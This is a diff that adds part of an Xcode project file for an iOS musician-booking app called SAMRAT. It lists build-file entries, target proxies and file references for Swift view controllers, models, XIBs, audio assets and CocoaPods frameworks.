@@ -1,0 +1,1745 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 54;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		180278CF2641A29B00F97F83 /* EditProfileVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180278CD2641A29B00F97F83 /* EditProfileVC.swift */; };
+		180278D02641A29B00F97F83 /* EditProfileVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 180278CE2641A29B00F97F83 /* EditProfileVC.xib */; };
+		180278D52641A7B800F97F83 /* GlobalAPICalling.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180278D42641A7B800F97F83 /* GlobalAPICalling.swift */; };
+		18082559263A974A0081A704 /* AppLanguageManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18082558263A974A0081A704 /* AppLanguageManager.swift */; };
+		18082561263A98890081A704 /* APIManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18082560263A98890081A704 /* APIManager.swift */; };
+		1808259D263A9A030081A704 /* Constant.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1808259C263A9A030081A704 /* Constant.swift */; };
+		180825A2263AA09F0081A704 /* SamratGlobal.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180825A1263AA09F0081A704 /* SamratGlobal.swift */; };
+		180825A8263AA0DA0081A704 /* LoginResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180825A7263AA0DA0081A704 /* LoginResponse.swift */; };
+		18190CE227F2A7430066036B /* WeddingMusiciaPaymentSucessVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18190CE027F2A7430066036B /* WeddingMusiciaPaymentSucessVC.swift */; };
+		18190CE327F2A7430066036B /* WeddingMusiciaPaymentSucessVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 18190CE127F2A7430066036B /* WeddingMusiciaPaymentSucessVC.xib */; };
+		182413522639C4E200883026 /* OnlinePaymentVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 182413502639C4E200883026 /* OnlinePaymentVC.swift */; };
+		182413532639C4E200883026 /* OnlinePaymentVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 182413512639C4E200883026 /* OnlinePaymentVC.xib */; };
+		182413592639CD4200883026 /* onlinePaymentMusiciansCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 182413572639CD4200883026 /* onlinePaymentMusiciansCell.swift */; };
+		1824135A2639CD4200883026 /* onlinePaymentMusiciansCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 182413582639CD4200883026 /* onlinePaymentMusiciansCell.xib */; };
+		182F1017263C473000F93825 /* CreateBookingModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 182F1016263C473000F93825 /* CreateBookingModel.swift */; };
+		182F101D263C4A9900F93825 /* PaymentSuccessVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 182F101B263C4A9900F93825 /* PaymentSuccessVC.swift */; };
+		182F101E263C4A9900F93825 /* PaymentSuccessVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 182F101C263C4A9900F93825 /* PaymentSuccessVC.xib */; };
+		182F1023263C50DA00F93825 /* MusicianModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 182F1022263C50DA00F93825 /* MusicianModel.swift */; };
+		182F1029263C63A900F93825 /* MusiciansTVFooter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 182F1028263C63A900F93825 /* MusiciansTVFooter.swift */; };
+		182F1031263C63B100F93825 /* MusiciansTVFooter.xib in Resources */ = {isa = PBXBuildFile; fileRef = 182F1030263C63B100F93825 /* MusiciansTVFooter.xib */; };
+		184FF36E26499A4F00BDC454 /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = 184FF37026499A4F00BDC454 /* Localizable.strings */; };
+		18559C8C264A2B220078C6C4 /* Localizer.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18559C8B264A2B220078C6C4 /* Localizer.swift */; };
+		185A6626264C03D0005D877C /* DemoGallaryVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 185A6624264C03D0005D877C /* DemoGallaryVC.swift */; };
+		185A6627264C03D0005D877C /* DemoGallaryVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 185A6625264C03D0005D877C /* DemoGallaryVC.xib */; };
+		187594E4264399C20015BEBC /* CSMCommanModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 187594E3264399C20015BEBC /* CSMCommanModel.swift */; };
+		187594EA26439CCA0015BEBC /* CancallationPolicyVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 187594E826439CCA0015BEBC /* CancallationPolicyVC.swift */; };
+		187594EB26439CCA0015BEBC /* CancallationPolicyVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 187594E926439CCA0015BEBC /* CancallationPolicyVC.xib */; };
+		187594F02643A9AA0015BEBC /* GalleryResponseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 187594EF2643A9AA0015BEBC /* GalleryResponseModel.swift */; };
+		187595BA2643FEFD0015BEBC /* MyBookingVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 187595B82643FEFD0015BEBC /* MyBookingVC.swift */; };
+		187595BB2643FEFD0015BEBC /* MyBookingVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 187595B92643FEFD0015BEBC /* MyBookingVC.xib */; };
+		187595EB264404BC0015BEBC /* MyUpcomingTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 187595E9264404BC0015BEBC /* MyUpcomingTVCell.swift */; };
+		187595EC264404BC0015BEBC /* MyUpcomingTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 187595EA264404BC0015BEBC /* MyUpcomingTVCell.xib */; };
+		187596072644139E0015BEBC /* BookingsModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 187596062644139E0015BEBC /* BookingsModel.swift */; };
+		18759648264442130015BEBC /* NotificationService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18759647264442130015BEBC /* NotificationService.swift */; };
+		1875965A26444B340015BEBC /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 1875965926444B330015BEBC /* GoogleService-Info.plist */; };
+		18877B44264B878000123166 /* SettingsModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18877B43264B878000123166 /* SettingsModel.swift */; };
+		1889FB42264C4F630067464E /* AudioErrorType.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1889FB3E264C4F630067464E /* AudioErrorType.swift */; };
+		1889FB43264C4F630067464E /* Song_file.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = 1889FB3F264C4F630067464E /* Song_file.mp3 */; };
+		1889FB44264C4F630067464E /* AudioPlayerManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1889FB40264C4F630067464E /* AudioPlayerManager.swift */; };
+		1889FB45264C4F630067464E /* song_fille_2.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = 1889FB41264C4F630067464E /* song_fille_2.mp3 */; };
+		188B0D2E263B01D8001EDA26 /* SingerModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188B0D2D263B01D8001EDA26 /* SingerModel.swift */; };
+		188E9E1E263FEACB00469D62 /* CategoriesModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188E9E1D263FEACB00469D62 /* CategoriesModel.swift */; };
+		188E9E26263FEBCC00469D62 /* HomeTCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188E9E24263FEBCC00469D62 /* HomeTCell.swift */; };
+		188E9E27263FEBCC00469D62 /* HomeTCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 188E9E25263FEBCC00469D62 /* HomeTCell.xib */; };
+		188E9E30263FF03500469D62 /* CatSingerListVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188E9E2E263FF03500469D62 /* CatSingerListVC.swift */; };
+		188E9E31263FF03500469D62 /* CatSingerListVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 188E9E2F263FF03500469D62 /* CatSingerListVC.xib */; };
+		188E9E37263FF0BF00469D62 /* SingerTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188E9E35263FF0BF00469D62 /* SingerTVCell.swift */; };
+		188E9E38263FF0BF00469D62 /* SingerTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 188E9E36263FF0BF00469D62 /* SingerTVCell.xib */; };
+		18B6054F2638470700AD9F47 /* MyAccountVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18B6054D2638470700AD9F47 /* MyAccountVC.swift */; };
+		18B605502638470700AD9F47 /* MyAccountVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 18B6054E2638470700AD9F47 /* MyAccountVC.xib */; };
+		18B6055926384D4500AD9F47 /* ChangePasswordVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18B6055726384D4500AD9F47 /* ChangePasswordVC.swift */; };
+		18B6055A26384D4500AD9F47 /* ChangePasswordVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 18B6055826384D4500AD9F47 /* ChangePasswordVC.xib */; };
+		18B6055F2638504B00AD9F47 /* BasicStuff.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18B6055E2638504B00AD9F47 /* BasicStuff.swift */; };
+		18B605652638526000AD9F47 /* FAQVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18B605632638526000AD9F47 /* FAQVC.swift */; };
+		18B605662638526000AD9F47 /* FAQVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 18B605642638526000AD9F47 /* FAQVC.xib */; };
+		18B6056C2638558400AD9F47 /* FaqTVHeader.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18B6056B2638558400AD9F47 /* FaqTVHeader.swift */; };
+		18B605712638558C00AD9F47 /* FaqTVHeader.xib in Resources */ = {isa = PBXBuildFile; fileRef = 18B605702638558C00AD9F47 /* FaqTVHeader.xib */; };
+		18B60578263857E800AD9F47 /* FaqTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18B60576263857E800AD9F47 /* FaqTVCell.swift */; };
+		18B60579263857E800AD9F47 /* FaqTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 18B60577263857E800AD9F47 /* FaqTVCell.xib */; };
+		18B605802638631D00AD9F47 /* MUSICIANSVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18B6057E2638631D00AD9F47 /* MUSICIANSVC.swift */; };
+		18B605812638631D00AD9F47 /* MUSICIANSVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 18B6057F2638631D00AD9F47 /* MUSICIANSVC.xib */; };
+		18B6058B2638635D00AD9F47 /* MusicianTVHeader.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18B6058A2638635D00AD9F47 /* MusicianTVHeader.swift */; };
+		18B605902638636600AD9F47 /* MusicianTVHeader.xib in Resources */ = {isa = PBXBuildFile; fileRef = 18B6058F2638636600AD9F47 /* MusicianTVHeader.xib */; };
+		18B60596263866F300AD9F47 /* MusiciansTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18B60594263866F300AD9F47 /* MusiciansTVCell.swift */; };
+		18B60597263866F300AD9F47 /* MusiciansTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 18B60595263866F300AD9F47 /* MusiciansTVCell.xib */; };
+		18D2AC3427A81974008C8C28 /* CustomAlertPopupVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18D2AC3227A81974008C8C28 /* CustomAlertPopupVC.swift */; };
+		18D2AC3527A81974008C8C28 /* CustomAlertPopupVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 18D2AC3327A81974008C8C28 /* CustomAlertPopupVC.xib */; };
+		18D3327327F2257600D5A92A /* SubCategoriesVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18D3327127F2257600D5A92A /* SubCategoriesVC.swift */; };
+		18D3327427F2257600D5A92A /* SubCategoriesVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 18D3327227F2257600D5A92A /* SubCategoriesVC.xib */; };
+		18D7F64D263989640074FBC0 /* BookNowWothCalendarVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18D7F64B263989640074FBC0 /* BookNowWothCalendarVC.swift */; };
+		18D7F64E263989640074FBC0 /* BookNowWothCalendarVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 18D7F64C263989640074FBC0 /* BookNowWothCalendarVC.xib */; };
+		18FB4C1A26412E3D000971F7 /* FaqsModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18FB4C1926412E3D000971F7 /* FaqsModel.swift */; };
+		1A118981B48C3C0DC71F594C /* Pods_SAMRAT.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A50A2C33DC80C72DBD521F1 /* Pods_SAMRAT.framework */; };
+		3909439A2E0058FA0084B250 /* FTAnimation+UIView.m in Sources */ = {isa = PBXBuildFile; fileRef = 3909438C2E0058FA0084B250 /* FTAnimation+UIView.m */; };
+		3909439B2E0058FA0084B250 /* FTAnimationManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 3909438D2E0058FA0084B250 /* FTAnimationManager.m */; };
+		3909439C2E0058FA0084B250 /* FTUtils+NSObject.m in Sources */ = {isa = PBXBuildFile; fileRef = 3909438E2E0058FA0084B250 /* FTUtils+NSObject.m */; };
+		3909439D2E0058FA0084B250 /* FTUtils+UIGestureRecognizer.m in Sources */ = {isa = PBXBuildFile; fileRef = 3909438F2E0058FA0084B250 /* FTUtils+UIGestureRecognizer.m */; };
+		420412072679EB9600309783 /* loading-icon_2.gif in Resources */ = {isa = PBXBuildFile; fileRef = 420412062679EB9600309783 /* loading-icon_2.gif */; };
+		420412092679F15F00309783 /* ActivityIndicatorWithLabel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 420412082679F15F00309783 /* ActivityIndicatorWithLabel.swift */; };
+		4204120C267B389100309783 /* MusicianListHeaderCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4204120A267B389100309783 /* MusicianListHeaderCell.swift */; };
+		4204120D267B389100309783 /* MusicianListHeaderCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 4204120B267B389100309783 /* MusicianListHeaderCell.xib */; };
+		42041210267B38B400309783 /* MusicianListCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4204120E267B38B400309783 /* MusicianListCell.swift */; };
+		42041211267B38B400309783 /* MusicianListCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 4204120F267B38B400309783 /* MusicianListCell.xib */; };
+		420DC767269C47F00078B92E /* AlertView.xib in Resources */ = {isa = PBXBuildFile; fileRef = 420DC765269C47EF0078B92E /* AlertView.xib */; };
+		420DC768269C47F00078B92E /* AlertView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 420DC766269C47EF0078B92E /* AlertView.swift */; };
+		425D61012685B38600B9B548 /* CircularProgressBar.swift in Sources */ = {isa = PBXBuildFile; fileRef = 425D61002685B38400B9B548 /* CircularProgressBar.swift */; };
+		425D610326904F3700B9B548 /* UImageView+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 425D610226904F3100B9B548 /* UImageView+Extension.swift */; };
+		42E1CBD1269CB06F005F37C4 /* AppConstant.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42E1CBD0269CB06E005F37C4 /* AppConstant.swift */; };
+		42E1CBD3269CB556005F37C4 /* HBSegmentedControl.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42E1CBD2269CB555005F37C4 /* HBSegmentedControl.swift */; };
+		73D299B633F4EFDF37980AFF /* Pods_SAMRATTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 10D449FD49F6DF71302C1C3B /* Pods_SAMRATTests.framework */; };
+		9164F0E025E766E10024E8FE /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9164F0DF25E766E10024E8FE /* SceneDelegate.swift */; };
+		9164F0E525E766E10024E8FE /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 9164F0E325E766E10024E8FE /* Main.storyboard */; };
+		9164F0E825E766E10024E8FE /* SAMRAT.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = 9164F0E625E766E10024E8FE /* SAMRAT.xcdatamodeld */; };
+		9164F0EA25E766E20024E8FE /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 9164F0E925E766E20024E8FE /* Assets.xcassets */; };
+		9164F0ED25E766E20024E8FE /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 9164F0EB25E766E20024E8FE /* LaunchScreen.storyboard */; };
+		9164F0F825E766E20024E8FE /* SAMRATTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9164F0F725E766E20024E8FE /* SAMRATTests.swift */; };
+		9164F10325E766E20024E8FE /* SAMRATUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9164F10225E766E20024E8FE /* SAMRATUITests.swift */; };
+		9179E90725E76A4000B3DC53 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9179E90325E76A4000B3DC53 /* AppDelegate.swift */; };
+		9179E90825E76A4000B3DC53 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9179E90625E76A4000B3DC53 /* ViewController.swift */; };
+		9179E90D25E76A5500B3DC53 /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9179E90C25E76A5500B3DC53 /* HomeViewController.swift */; };
+		9179E91225E76A6F00B3DC53 /* MusiciansViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9179E91125E76A6F00B3DC53 /* MusiciansViewController.swift */; };
+		9179E91725E76A7D00B3DC53 /* GalleryViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9179E91625E76A7D00B3DC53 /* GalleryViewController.swift */; };
+		9179E91C25E76A8800B3DC53 /* SettingsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9179E91B25E76A8800B3DC53 /* SettingsViewController.swift */; };
+		9179E92925E76B2C00B3DC53 /* TabBarViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9179E92825E76B2C00B3DC53 /* TabBarViewController.swift */; };
+		9180CA5125EB633C00C37532 /* AppGlobal.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9180CA5025EB633C00C37532 /* AppGlobal.swift */; };
+		9180CA5B25EB8C2A00C37532 /* MusiciansTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9180CA5A25EB8C2A00C37532 /* MusiciansTableViewCell.swift */; };
+		9180CA6025EB927C00C37532 /* MusiciansDetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9180CA5F25EB927C00C37532 /* MusiciansDetailsViewController.swift */; };
+		9180CA6825EB9B0100C37532 /* SettingsTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9180CA6725EB9B0100C37532 /* SettingsTableViewCell.swift */; };
+		9180CA6D25EB9CD100C37532 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9180CA6C25EB9CD100C37532 /* LoginViewController.swift */; };
+		9180CA7225EB9CDD00C37532 /* ForgotPasswordViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9180CA7125EB9CDD00C37532 /* ForgotPasswordViewController.swift */; };
+		9180CA7725EB9CE600C37532 /* SignUpViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9180CA7625EB9CE600C37532 /* SignUpViewController.swift */; };
+		9180CA7C25EB9CF000C37532 /* ContactUsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9180CA7B25EB9CF000C37532 /* ContactUsViewController.swift */; };
+		9180CA8125EB9D7900C37532 /* CMSViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9180CA8025EB9D7900C37532 /* CMSViewController.swift */; };
+		9A04CE7226C521A900425575 /* MultipleSingersMusicianbookVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9A04CE7026C521A900425575 /* MultipleSingersMusicianbookVC.swift */; };
+		9A04CE7326C521A900425575 /* MultipleSingersMusicianbookVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 9A04CE7126C521A900425575 /* MultipleSingersMusicianbookVC.xib */; };
+		9A36869226C6D1D100EDF026 /* ServicesCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9A36869026C6D1D100EDF026 /* ServicesCell.swift */; };
+		9A36869326C6D1D100EDF026 /* ServicesCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 9A36869126C6D1D100EDF026 /* ServicesCell.xib */; };
+		9A5CE42426CA889F004584A1 /* ServiceModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9A5CE42326CA889F004584A1 /* ServiceModel.swift */; };
+		9A7D888C26C1B7EC00DC1C28 /* MultipleSingerVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9A7D888A26C1B7EC00DC1C28 /* MultipleSingerVC.swift */; };
+		9A7D888D26C1B7EC00DC1C28 /* MultipleSingerVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 9A7D888B26C1B7EC00DC1C28 /* MultipleSingerVC.xib */; };
+		BC32307029DAD2700068CB36 /* SMBandsBand.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC32306E29DAD2700068CB36 /* SMBandsBand.swift */; };
+		BC32307129DAD2700068CB36 /* SMBands.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC32306F29DAD2700068CB36 /* SMBands.swift */; };
+		BC32307329DAD2D10068CB36 /* APIClient.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC32307229DAD2D10068CB36 /* APIClient.swift */; };
+		BC32307529DAD3440068CB36 /* NetConnection.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC32307429DAD3440068CB36 /* NetConnection.swift */; };
+		BC91785829D7193500158B7A /* SelectBandViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC91785729D7193500158B7A /* SelectBandViewController.swift */; };
+		BCC211C32901572900CFC359 /* WebPaymentVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BCC211C22901572900CFC359 /* WebPaymentVC.swift */; };
+		CE453B9CF770AF1623287508 /* Pods_SAMRAT_SAMRATUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = BF09C5547A0BC6EC073B7378 /* Pods_SAMRAT_SAMRATUITests.framework */; };
+		F78CD53D26D2059B00178848 /* LanguageSelectVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = F78CD53C26D2059B00178848 /* LanguageSelectVC.swift */; };
+		F78CD54326D21D3500178848 /* VerifyOTPVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = F78CD54226D21D3500178848 /* VerifyOTPVC.swift */; };
+		F78CD54926D21D4500178848 /* SendOTPVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = F78CD54826D21D4500178848 /* SendOTPVC.swift */; };
+		F7A06AB3270AE14B00063A8C /* Model.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = F7A06AB1270AE14B00063A8C /* Model.xcdatamodeld */; };
+		FA435E5127C90F9D001AC622 /* CommonButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA435E4F27C90F9D001AC622 /* CommonButton.swift */; };
+		FA435E5227C90F9D001AC622 /* CommonButton.xib in Resources */ = {isa = PBXBuildFile; fileRef = FA435E5027C90F9D001AC622 /* CommonButton.xib */; };
+		FA68640228A439F6007A22FE /* CountryModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA68640128A439F6007A22FE /* CountryModel.swift */; };
+		FA68640528A43A42007A22FE /* CountrySelectionViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA68640328A43A42007A22FE /* CountrySelectionViewController.swift */; };
+		FA68640A28A43E7D007A22FE /* CountrySelectionTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = FA68640828A43E7C007A22FE /* CountrySelectionTableViewCell.xib */; };
+		FA68640B28A43E7D007A22FE /* CountrySelectionTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA68640928A43E7D007A22FE /* CountrySelectionTableViewCell.swift */; };
+		FA7724EB280D89C50031DEAC /* MaintenanceViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA7724EA280D89C50031DEAC /* MaintenanceViewController.swift */; };
+		FA8A433827BBB158000E370A /* MusiciansServiceTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = FA8A433627BBB158000E370A /* MusiciansServiceTVCell.xib */; };
+		FA8A433927BBB158000E370A /* MusiciansServiceTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA8A433727BBB158000E370A /* MusiciansServiceTVCell.swift */; };
+		FA8A433C27BCB54D000E370A /* MusicBarTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA8A433A27BCB54D000E370A /* MusicBarTableViewCell.swift */; };
+		FA8A433D27BCB54D000E370A /* MusicBarTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = FA8A433B27BCB54D000E370A /* MusicBarTableViewCell.xib */; };
+		FA8A434027BD7D39000E370A /* ButtonCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA8A433E27BD7D39000E370A /* ButtonCell.swift */; };
+		FA8A434127BD7D39000E370A /* ButtonCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = FA8A433F27BD7D39000E370A /* ButtonCell.xib */; };
+		FA8F917727BA735600339EAE /* MusiciansDetailViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA8F917627BA735600339EAE /* MusiciansDetailViewController.swift */; };
+		FAB153072816DE0300F3A540 /* SingerServiceModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FAB153062816DE0300F3A540 /* SingerServiceModel.swift */; };
+		FAB153C028205DE300F3A540 /* BookNowWothCalendarVCBottom.swift in Sources */ = {isa = PBXBuildFile; fileRef = FAB153BE28205DE200F3A540 /* BookNowWothCalendarVCBottom.swift */; };
+		FAB153C128205DE300F3A540 /* BookNowWothCalendarVCBottom.xib in Resources */ = {isa = PBXBuildFile; fileRef = FAB153BF28205DE200F3A540 /* BookNowWothCalendarVCBottom.xib */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXContainerItemProxy section */
+		9164F0F425E766E20024E8FE /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 9164F0D225E766E10024E8FE /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 9164F0D925E766E10024E8FE;
+			remoteInfo = SAMRAT;
+		};
+		9164F0FF25E766E20024E8FE /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 9164F0D225E766E10024E8FE /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 9164F0D925E766E10024E8FE;
+			remoteInfo = SAMRAT;
+		};
+/* End PBXContainerItemProxy section */
+
+/* Begin PBXFileReference section */
+		10D449FD49F6DF71302C1C3B /* Pods_SAMRATTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_SAMRATTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		180278CD2641A29B00F97F83 /* EditProfileVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditProfileVC.swift; sourceTree = "<group>"; };
+		180278CE2641A29B00F97F83 /* EditProfileVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = EditProfileVC.xib; sourceTree = "<group>"; };
+		180278D42641A7B800F97F83 /* GlobalAPICalling.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GlobalAPICalling.swift; sourceTree = "<group>"; };
+		18082558263A974A0081A704 /* AppLanguageManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppLanguageManager.swift; sourceTree = "<group>"; };
+		18082560263A98890081A704 /* APIManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APIManager.swift; sourceTree = "<group>"; };
+		1808259C263A9A030081A704 /* Constant.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Constant.swift; sourceTree = "<group>"; };
+		180825A1263AA09F0081A704 /* SamratGlobal.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SamratGlobal.swift; sourceTree = "<group>"; };
+		180825A7263AA0DA0081A704 /* LoginResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginResponse.swift; sourceTree = "<group>"; };
+		18190CE027F2A7430066036B /* WeddingMusiciaPaymentSucessVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WeddingMusiciaPaymentSucessVC.swift; sourceTree = "<group>"; };
+		18190CE127F2A7430066036B /* WeddingMusiciaPaymentSucessVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = WeddingMusiciaPaymentSucessVC.xib; sourceTree = "<group>"; };
+		182413502639C4E200883026 /* OnlinePaymentVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OnlinePaymentVC.swift; sourceTree = "<group>"; };
+		182413512639C4E200883026 /* OnlinePaymentVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = OnlinePaymentVC.xib; sourceTree = "<group>"; };
+		182413572639CD4200883026 /* onlinePaymentMusiciansCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = onlinePaymentMusiciansCell.swift; sourceTree = "<group>"; };
+		182413582639CD4200883026 /* onlinePaymentMusiciansCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = onlinePaymentMusiciansCell.xib; sourceTree = "<group>"; };
+		182F1016263C473000F93825 /* CreateBookingModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateBookingModel.swift; sourceTree = "<group>"; };
